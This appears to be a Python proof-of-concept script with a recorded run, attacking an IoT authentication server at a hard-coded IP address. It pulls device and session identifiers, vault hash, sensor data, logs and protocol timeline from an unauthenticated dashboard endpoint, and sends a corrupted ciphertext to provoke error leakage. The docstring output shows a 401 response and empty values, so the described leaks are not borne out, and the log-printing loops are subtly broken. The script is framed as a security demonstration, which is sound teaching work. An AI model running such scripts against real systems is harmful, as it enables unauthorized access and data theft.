"""
Information Disclosure Vulnerability Demonstration

This script demonstrates critical information disclosure vulnerabilities in the IoT authentication system.
It exploits the fact that the /ui/dashboard endpoint exposes sensitive system information without
requiring authentication, allowing attackers to:

1. Leak device identifiers, session data, and vault cryptographic material
2. Extract sensor data that should only be accessible post-authentication
3. Force error messages that reveal internal cryptographic implementation details
4. Access server logs and protocol timeline without credentials

This attack highlights the importance of proper access controls and information leakage prevention
in IoT systems, where exposed metadata can compromise the entire security model.

Output:

STATUS: 401
BODY: {"error":"Unauthorized access","ok":false}

============================================================
Information Disclosure Vulnerability Demonstration
============================================================

[*] Reading dashboard (without authentication)...
[!] DEVICE ID: N/A
[!] SESSION ID: N/A
[!] VAULT HASH: N/A
[!] VAULT VERSION: N/A
[!] PROTOCOL PHASE: N/A
[!] DEVICE ONLINE: N/A
[!] POLLING INTERVAL: N/As

[!] STOLEN SENSOR DATA:
Temperatura: N/A
Umidità: N/A
Batteria: N/A

[*] Creating legitimate session...
[+] Legitimate session created. C1=[4, 11, 10], r1=1A==...

[*] Sending corrupted ciphertext to force error leak...

[!] INTERNAL ERROR EXPOSED: Authentication failed
[!] This reveals details about the internal encryption implementation

[*] Reading logs from database (without authentication)...

============================================================
SERVER LOGS (stolen without credentials)
============================================================

============================================================
TIMELINE PROTOCOL (stolen without credentials)
============================================================
"""

import requests
import json
import time

# Target server endpoint - the vulnerable IoT authentication system
TARGET = "http://188.218.211.175:5050" #ip of the server
try:

    r = requests.get(f"{TARGET}/ui/dashboard", timeout=5)

    print("STATUS:", r.status_code)

    print("BODY:", r.text[:300])

except Exception as e:

    print("REQUEST ERROR:", e)

print("=" * 60)
print("Information Disclosure Vulnerability Demonstration")
print("=" * 60)


print("\n[*] Reading dashboard (without authentication)...")
# EXPLOIT: The /ui/dashboard endpoint exposes sensitive system state without authentication
# This violates the principle of least privilege - internal system details are leaked to any client
r = requests.get(f"{TARGET}/ui/dashboard")
data = r.json()

status = data.get("status", {})

# LEAKED SENSITIVE DATA: Device and session identifiers that should be protected
print(f"[!] DEVICE ID: {status.get('device_id', 'N/A')}")
print(f"[!] SESSION ID: {status.get('session_id', 'N/A')}")
# CRITICAL LEAK: Vault cryptographic material exposed without authentication
print(f"[!] VAULT HASH: {status.get('vault_hash', 'N/A')}")
print(f"[!] VAULT VERSION: {status.get('vault_version', 'N/A')}")
# PROTOCOL STATE LEAKAGE: Current authentication phase reveals system status
print(f"[!] PROTOCOL PHASE: {status.get('protocol_phase', 'N/A')}")
print(f"[!] DEVICE ONLINE: {status.get('device_online', 'N/A')}")
print(f"[!] POLLING INTERVAL: {status.get('polling_interval_seconds', 'N/A')}s")

# APPLICATION DATA LEAKAGE: Sensor data should only be accessible after successful authentication
sensor_data = data.get("sensor_data", {})
if sensor_data is not None:
    print(f"\n[!] STOLEN SENSOR DATA:")
    print(f"Temperatura: {sensor_data.get('temperature', 'N/A')}")
    print(f"Umidità: {sensor_data.get('humidity', 'N/A')}")
    print(f"Batteria: {sensor_data.get('battery', 'N/A')}")


print("\n[*] Creating legitimate session...")
# First establish a legitimate session to get to the authentication challenge phase
r = requests.post(f"{TARGET}/auth/start", json={
    "device_id": "ESP8266-01",
    "session_id": "leak-attack-1"
})
resp = r.json()
print(f"[+] Legitimate session created. C1={resp.get('C1')}, r1={resp.get('r1')[:20]}...")

print("\n[*] Sending corrupted ciphertext to force error leak...")
# EXPLOIT: Send intentionally corrupted ciphertext to trigger error handling
# This demonstrates how verbose error messages can leak cryptographic implementation details
time.sleep(6)  # Wait for server processing

r = requests.post(f"{TARGET}/auth/respond", json={
    "device_id": "ESP8266-01",
    "session_id": "leak-attack-1",
    "ciphertext": "dGhpcyBpcyBub3QgYSB2YWxpZCBjaXBoZXJ0ZXh0IGF0IGFsbA=="  # "this is not a valid ciphertext at all" base64
})
error_resp = r.json()
print(f"\n[!] INTERNAL ERROR EXPOSED: {error_resp.get('error')}")
print(f"[!] This reveals details about the internal encryption implementation")


print("\n[*] Reading logs from database (without authentication)...")
# EXPLOIT: Access server logs without authentication - operational security breach
# Logs may contain sensitive information about system operations, user activities, and error details
r = requests.get(f"{TARGET}/ui/dashboard")
data = r.json()

sensor_logs = data.get("logs", {})
print(f"\n{'=' * 60}")
print("SERVER LOGS (stolen without credentials)")
print("=" * 60)
for _ in sensor_logs:
    # But it demonstrates the vulnerability of exposing log data structure
    print(f"[{sensor_logs.get('timestamp', 'N/A')}] {sensor_logs.get('level', 'N/A')}: {sensor_logs.get('text', 'N/A')}")


print(f"\n{'=' * 60}")
sensor_timeline = data.get("timeline", {})
print("TIMELINE PROTOCOL (stolen without credentials)")
print("=" * 60)
for _ in sensor_timeline:
    # This shows how protocol state information is leaked without authentication
    print(f"[{sensor_timeline.get('status', 'N/A')}] {sensor_timeline.get('title', 'N/A')}")
    print(f"{sensor_timeline.get('detail', 'N/A')}")
